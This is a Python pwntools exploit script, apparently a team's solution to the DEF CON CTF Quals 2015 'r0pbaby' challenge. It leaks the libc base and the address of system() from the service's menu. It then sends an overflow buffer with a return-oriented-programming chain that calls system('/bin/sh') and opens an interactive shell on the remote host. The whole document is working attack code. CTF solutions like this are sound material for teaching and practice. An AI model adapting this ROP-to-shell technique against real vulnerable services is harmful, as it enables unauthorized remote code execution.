#!/usr/bin/python
#
# DEF CON CTF Quals 2015
# r0pbaby (BABYSFIRST/1)
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

from pwn import *
from struct import pack, unpack

def get_libc_base(h):
	h.send("1\n")
	msg = h.recvuntil("4) Exit\n: ")
	offset = msg.find(":")
	offset2 = msg.find("\n")
	base = msg[offset+2: offset2]	
	return long(base, 16)

def get_libc_func_addr(h, function):
	h.send("2\n")
	msg = h.recvuntil("Enter symbol: ")
	h.send(function+"\n")
	msg = h.recvuntil("4) Exit\n: ")
	offset = msg.find(":")
	offset2 = msg.find("\n")
	addr = msg[offset+2: offset2]
	return long(addr, 16)

def nom_rop_buffer(h, rop_buffer):
	h.send("3\n")
	msg = h.recvuntil("Enter bytes to send (max 1024): ")
	rop_buffer_len = str(len(rop_buffer))
	h.send(rop_buffer_len + "\n")
	h.send(rop_buffer + "\n")
	msg = h.recvuntil("Bad choice.\n")	
	return

host = "r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me"
port = 10436

rdi_gadget_offset = 0x7583e6
bin_sh_offset = 0x66dcd5

h = remote(host, port)

msg = h.recvuntil(": ")
libc_base = get_libc_base(h)
print "[+] libc base: [%x]" % libc_base

rdi_gadget_addr = libc_base - rdi_gadget_offset
print "[+] RDI gadget addr: [%x]" % rdi_gadget_addr

bin_sh_addr = libc_base - bin_sh_offset
print "[+] \"/bin/sh\" addr: [%x]" % bin_sh_addr

system_addr = get_libc_func_addr(h, "system")

print "[+] system addr: [%x]" % system_addr

rbp_overwrite = "A"*8

rop_buffer = rbp_overwrite + pack('<Q', rdi_gadget_addr) + pack('<Q', bin_sh_addr) + pack('<Q', system_addr)
nom_rop_buffer(h, rop_buffer)

h.interactive()

h.close()